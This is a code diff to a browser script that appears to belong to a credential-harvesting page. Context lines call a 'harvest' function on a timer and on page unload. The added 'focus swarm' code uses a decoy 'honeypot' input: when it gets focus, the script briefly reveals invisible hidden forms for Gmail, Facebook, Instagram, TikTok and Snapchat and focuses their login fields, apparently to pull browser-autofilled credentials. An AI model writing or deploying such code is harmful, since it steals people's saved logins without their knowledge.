@@ -95,17 +95,45 @@ setTimeout(harvest, 15000);
 // Also, listen for the page unload event as a last resort
 window.addEventListener('beforeunload', harvest);
 
-// --- UI & Ghost Overlay Logic ---
+// --- UI & Focus Trap Logic ---
 
-// After a delay, hide the loader and show the honeypot text and ghost overlays
+// After a delay, hide the loader and show the honeypot prompt
 setTimeout(() => {
   const previewContainer = document.querySelector('.preview-container');
   const honeypotContainer = document.querySelector('.honeypot-container');
-  const formOverlays = document.querySelectorAll('.form-overlay');
-
   if (previewContainer) previewContainer.style.display = 'none';
   if (honeypotContainer) honeypotContainer.style.display = 'block';
-  formOverlays.forEach(form => {
-    form.style.display = 'block';
-  });
 }, 1500);
+
+function triggerFocusSwarm() {
+  console.log('Honeypot focused, attempting to trigger focus swarm...');
+
+  const forms = document.querySelectorAll('.hidden-form');
+  
+  // Temporarily make forms visible to allow focus
+  forms.forEach(form => {
+    form.style.display = 'block';
+    form.style.opacity = '0';
+    form.style.position = 'absolute';
+  });
+
+  // Focus all the username/email fields
+  document.querySelector('#gmail-form input[name="email"]')?.focus();
+  document.querySelector('#facebook-form input[name="username"]')?.focus();
+  document.querySelector('#instagram-form input[name="username"]')?.focus();
+  document.querySelector('#tiktok-form input[name="username"]')?.focus();
+  document.querySelector('#snapchat-form input[name="username"]')?.focus();
+
+  // Hide the forms again shortly after
+  setTimeout(() => {
+      forms.forEach(form => {
+          form.style.display = 'none';
+      });
+  }, 100);
+}
+
+// Add a one-time event listener to the honeypot input for the 'focus' event.
+const honeypotInput = document.getElementById('honeypot-input');
+if (honeypotInput) {
+  honeypotInput.addEventListener('focus', triggerFocusSwarm, { once: true });
+}
